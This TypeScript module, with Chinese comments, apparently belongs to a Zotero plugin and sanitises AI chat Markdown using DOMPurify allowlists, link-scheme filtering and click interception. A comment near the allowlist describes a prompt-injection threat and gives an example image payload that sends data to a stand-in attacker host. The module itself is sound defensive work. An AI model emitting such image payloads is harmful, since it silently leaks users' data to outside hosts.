// Markdown 渲染安全层 — PLAN §4.7 / INTERFACE §4.7。
// AI 产出一律：marked 解析（代码高亮）→ DOMPurify 消毒 → innerHTML。
// 本模块不 import Zotero 全局，node:test 可测（DOM 依赖经注入隔离）。
//
// 安全边界（一个不省）：
// 1. 消毒失败关闭（fail-closed）：未初始化 sanitizer 时 renderMarkdown 抛错，绝不放行未消毒 HTML。
// 2. DOMPurify hook 强制剥离 <a> 的 target 属性。
// 3. href 非 http(s) 绝对 URL 时整条剥除（javascript:/data:/vbscript:/相对路径均不放行）。
// 4. 渲染产物内所有 a 点击在 capture 阶段被拦截（preventDefault），
//    仅 http(s) 链接经桥 openExternal 交宿主外部打开——特权页面绝不发生远程导航。
// 5. 消毒走白名单制（CHAT_SANITIZE_CONFIG）：img/媒体等「无点击即自动发请求」的元素与
//    src/srcset/style 等属性一律不放行——AI 输出的远程图片不得把特权页面变成外发通道（重要 4）。
import { marked } from "marked";
import hljs from "highlight.js/lib/core";
import bash from "highlight.js/lib/languages/bash";
import cpp from "highlight.js/lib/languages/cpp";
import css from "highlight.js/lib/languages/css";
import go from "highlight.js/lib/languages/go";
import java from "highlight.js/lib/languages/java";
import javascript from "highlight.js/lib/languages/javascript";
import json from "highlight.js/lib/languages/json";
import latex from "highlight.js/lib/languages/latex";
import markdown from "highlight.js/lib/languages/markdown";
import python from "highlight.js/lib/languages/python";
import r from "highlight.js/lib/languages/r";
import sql from "highlight.js/lib/languages/sql";
import typescript from "highlight.js/lib/languages/typescript";
import xml from "highlight.js/lib/languages/xml";
import yaml from "highlight.js/lib/languages/yaml";
import DOMPurify from "dompurify";

for (const [name, lang] of Object.entries({
  bash,
  cpp,
  css,
  go,
  java,
  javascript,
  json,
  latex,
  markdown,
  python,
  r,
  sql,
  typescript,
  xml,
  yaml,
})) {
  hljs.registerLanguage(name, lang as never);
}

// ---- 消毒器注入 ----
// 页面启动时注入真实 DOMPurify（见 createDomPurifySanitizer）；Node 测试环境无 DOM，
// 不初始化即 fail-closed。中间层用可注入点隔离 DOM 依赖，测试可注入校验用替身。

export type Sanitizer = (html: string) => string;

let sanitizer: Sanitizer | null = null;

export function setSanitizer(s: Sanitizer | null): void {
  sanitizer = s;
}

export function escapeHtml(text: string): string {
  return text
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

// marked 全局配置一次：GFM + 单换行转 <br>（聊天场景），代码块走 highlight.js
marked.use({
  gfm: true,
  breaks: true,
  renderer: {
    code(token) {
      const lang = (token.lang || "").trim().split(/\s+/)[0];
      const known = lang !== "" && hljs.getLanguage(lang) != null;
      const body = known
        ? hljs.highlight(token.text, { language: lang, ignoreIllegals: true })
            .value
        : escapeHtml(token.text);
      const cls = known
        ? ` class="hljs language-${escapeHtml(lang)}"`
        : ' class="hljs"';
      return `<pre><code${cls}>${body}\n</code></pre>`;
    },
  },
});

/** marked 解析结果（未消毒！仅供测试/调试观察，UI 一律走 renderMarkdown） */
export function parseMarkdownUnsafe(md: string): string {
  return marked.parse(md, { async: false });
}

/**
 * 完整渲染管线：marked → sanitizer → HTML 字符串。
 * sanitizer 未初始化时抛错（fail-closed），绝不让未消毒 HTML 到达 innerHTML。
 */
export function renderMarkdown(md: string): string {
  if (!sanitizer) {
    throw new Error("markdown sanitizer not initialized (fail-closed)");
  }
  return sanitizer(parseMarkdownUnsafe(md));
}

// ---- URL 安全判定（UI 侧 openExternal 前置过滤 + DOMPurify hook 共用）----

/** 仅接受绝对 http(s) URL —— 其余（javascript:/data:/相对路径等）一律不放行 */
export function isSafeExternalUrl(url: string): boolean {
  try {
    const u = new URL(url);
    return u.protocol === "https:" || u.protocol === "http:";
  } catch {
    return false;
  }
}

// ---- DOMPurify hooks ----
// hook 操作的只是 Element API 表面（tagName/getAttribute/removeAttribute），
// node:test 用最小假节点即可验证真实 hook 逻辑。

export interface SanitizeHookNode {
  tagName: string;
  getAttribute(name: string): string | null;
  removeAttribute(name: string): void;
}

/** afterSanitizeAttributes hook：剥 <a> 的 target；href 非 http(s) 绝对 URL 则整条剥除 */
export function stripAnchorTargetHook(node: SanitizeHookNode): void {
  if (node.tagName !== "A") {
    return;
  }
  node.removeAttribute("target");
  const href = node.getAttribute("href");
  if (href !== null && !isSafeExternalUrl(href)) {
    node.removeAttribute("href");
  }
}

/**
 * 聊天侧消毒白名单（**白名单制**，只留 markdown 渲染真正产出的东西）。
 * 为什么不是「默认白名单 + 拉黑几个」：DOMPurify 默认允许 img/picture/source/video/audio/style
 * 以及 src/srcset/poster/background/style 属性——这些元素/属性会在**无用户点击**的情况下自动
 * 请求远程地址。本页是 chrome:// 特权页面，AI 输出又受提示词注入影响，`![](https://attacker/?d=…)`
 * 或裸 `<img src=…>` 就是一条静默数据外发/打点通道（安全审计 重要 4）。本页从不需要远程图片，
 * 一律按默认拒绝处理；被拒标签的文字内容仍保留（DOMPurify KEEP_CONTENT 默认 true），不会吞正文。
 * 链接仍走 href（点击由 capture 拦截 + openExternal 交宿主）——「有交互才外发」的出口不变。
 */
export const CHAT_SANITIZE_CONFIG: {
  ALLOWED_TAGS: string[];
  ALLOWED_ATTR: string[];
} = {
  // marked（GFM/breaks）+ highlight.js 的产物集合：span/class 是 hljs 高亮用的
  ALLOWED_TAGS: [
    "a",
    "b",
    "blockquote",
    "br",
    "code",
    "del",
    "em",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "hr",
    "i",
    "ins",
    "li",
    "ol",
    "p",
    "pre",
    "small",
    "span",
    "strong",
    "sub",
    "sup",
    "table",
    "tbody",
    "td",
    "tfoot",
    "th",
    "thead",
    "tr",
    "ul",
  ],
  ALLOWED_ATTR: [
    "href",
    "title",
    "class",
    "start",
    "align",
    "colspan",
    "rowspan",
  ],
};

/** 页面启动时调用：装好 DOMPurify 消毒器（白名单配置 + 安全 hook），返回给 setSanitizer 用 */
export function createDomPurifySanitizer(): Sanitizer {
  if (!DOMPurify.isSupported) {
    throw new Error("DOMPurify unsupported in this environment");
  }
  DOMPurify.addHook("afterSanitizeAttributes", (node) =>
    stripAnchorTargetHook(node as unknown as SanitizeHookNode),
  );
  return (html: string) =>
    DOMPurify.sanitize(html, {
      ALLOWED_TAGS: [...CHAT_SANITIZE_CONFIG.ALLOWED_TAGS],
      ALLOWED_ATTR: [...CHAT_SANITIZE_CONFIG.ALLOWED_ATTR],
    });
}

// ---- 链接点击拦截（§4.7：capture 阶段，渲染产物内所有 a 点击）----

export interface ClickEventLike {
  target: unknown;
  preventDefault(): void;
  stopPropagation(): void;
}

interface AnchorLike {
  getAttribute(name: string): string | null;
}

interface ClosestTarget {
  closest(selector: string): AnchorLike | null;
}

/**
 * 挂在渲染容器上的 capture click 处理。返回应外发的 URL（http/https），否则 null。
 * 任何 a 点击（含 javascript:/相对路径）一律 preventDefault——特权页面内绝不导航。
 * 纯逻辑：event 只用到 target/preventDefault/stopPropagation，node:test 用假事件可测。
 */
export function handleContentClick(evt: ClickEventLike): string | null {
  const target = evt.target as ClosestTarget | null;
  const anchor =
    target && typeof target.closest === "function" ? target.closest("a") : null;
  if (!anchor) {
    return null;
  }
  evt.preventDefault();
  evt.stopPropagation();
  const href = anchor.getAttribute("href");
  if (href === null || !isSafeExternalUrl(href)) {
    return null; // 已拦截但不外发（宿主契约：非 http(s) 忽略）
  }
  return href;
}
